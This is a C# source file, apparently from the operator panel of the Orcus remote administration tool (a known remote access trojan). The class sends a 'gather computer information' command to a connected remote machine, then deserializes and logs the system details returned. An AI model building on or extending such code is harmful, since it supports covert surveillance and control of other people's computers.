using System;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Communication;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.ComputerInformation
{
    public class ComputerInformationCommand : Command
    {
        public event EventHandler<Shared.Commands.ComputerInformation.ComputerInformation> ComputerInformationReceived;
        public event EventHandler Failed;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((CommandResponse) parameter[0])
            {
                case CommandResponse.Failed:
                    LogService.Error(
                        string.Format((string) Application.Current.Resources["GatheringComputerInformationFailed"],
                            Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    Failed?.Invoke(this, EventArgs.Empty);
                    break;
                case CommandResponse.Successful:
                    var serializer = new Serializer(typeof (Shared.Commands.ComputerInformation.ComputerInformation));
                    var computerInformation =
                        serializer.Deserialize<Shared.Commands.ComputerInformation.ComputerInformation>(parameter, 1);
                    computerInformation.Timestamp = computerInformation.Timestamp.ToLocalTime();
                    LogService.Receive(
                        string.Format(
                            (string) Application.Current.Resources["ComputerInformationSuccessfullyReceived"],
                            computerInformation.ProcessTime));
                    ComputerInformationReceived?.Invoke(this, computerInformation);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetInformation()
        {
            LogService.Send((string) Application.Current.Resources["GatherComputerInformation"]);
            ConnectionInfo.SendCommand(this, new byte[0]);
        }

        public override string DescribePackage(byte[] data, bool isReceived)
        {
            return isReceived ? ((CommandResponse) data[0]).ToString() : "GatherComputerInformation";
        }

        protected override uint GetId()
        {
            return 4;
        }
    }
}